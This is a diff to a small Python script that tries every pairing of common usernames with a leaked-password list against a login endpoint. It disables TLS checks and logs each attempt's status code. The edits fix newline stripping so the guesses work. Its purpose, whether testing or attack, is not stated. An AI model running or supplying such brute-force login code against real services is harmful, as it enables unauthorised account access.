@@ -10,10 +10,10 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 if __name__ == '__main__':
     with open('top-usernames-shortlist.txt', 'r') as f:
-        username = f.readlines()
+        username = [x.strip() for x in f.readlines()]
 
     with open('darkweb2017-top100.txt', 'r') as f:
-        password = f.readlines()
+        password = [x.strip() for x in f.readlines()]
 
     shuffle(username)
     shuffle(password)
@@ -23,6 +23,6 @@ if __name__ == '__main__':
             'username': user,
             'password': pwd
         }, verify=False)
-        print(f'{resp.request.method} {(user, pwd)} > {resp.status_code}')
+        print(f'{resp.request.method} {(user, pwd)} > {resp.status_code}', flush=True)
 
         sleep(1)
